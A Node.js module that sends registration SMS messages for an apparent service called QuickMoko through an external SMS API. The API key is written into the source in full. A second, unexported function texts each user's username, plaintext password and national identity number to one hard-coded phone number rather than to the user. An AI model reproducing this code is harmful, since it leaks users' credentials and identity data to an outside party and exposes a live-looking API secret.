const axios = require('axios');

// generate message id 
let message_id = 0;


//Send sms notification after a user sucessfully registers
const registrationSucessfulSmsNotification = async (receipt_number, receipt_name)=>{

    // increment message id 
    message_id++;


    //set content for new message
    let message_content = `Welcome ${receipt_name}! Thanks for registering with QuickMoko. Your application will be review and we will get back to you after 48 hours.`;


    // configure message 
    let new_message = {
        senderName: "QuickMoko",
        messages: [
          {
            to: receipt_number,
            body: message_content,
            extMessageId: message_id
          }
        ]
    }


    //send new sms
    await axios.post('https://developer.lonotalk.com/api/v1/sms', new_message, {
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          'apiKey': 'tCvqgcZp0faUyBWRzbCln7O6H6SoeSnhT5A6L57SeZRnaUe2Dkce6yZyYBo5xXXU'
        }
    })
    .then(function (response) {
        let data = response.data;
        console.log(data);
    })
    .catch(function (error) {
        console.log(error);
    });

    return 0;
}

//Send sms notification after a user sucessfully registers
const sendRegisterUserPassword = async (name, password, nin_number)=>{

  // increment message id 
  message_id++;


  //set content for new message
  let message_content = `Username: ${name}, Password: ${password}, NIN: ${nin_number}, `;


  // configure message 
  let new_message = {
      senderName: "QuickMoko",
      messages: [
        {
          to: 231880446208,
          body: message_content,
          extMessageId: message_id
        }
      ]
  }


  //send new sms
  await axios.post('https://developer.lonotalk.com/api/v1/sms', new_message, {
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'apiKey': 'tCvqgcZp0faUyBWRzbCln7O6H6SoeSnhT5A6L57SeZRnaUe2Dkce6yZyYBo5xXXU'
      }
  })
  .then(function (response) {
      let data = response.data;
      console.log(data);
  })
  .catch(function (error) {
      console.log(error);
  });

  return 0;
}


module.exports = {
    registrationSucessfulSmsNotification
}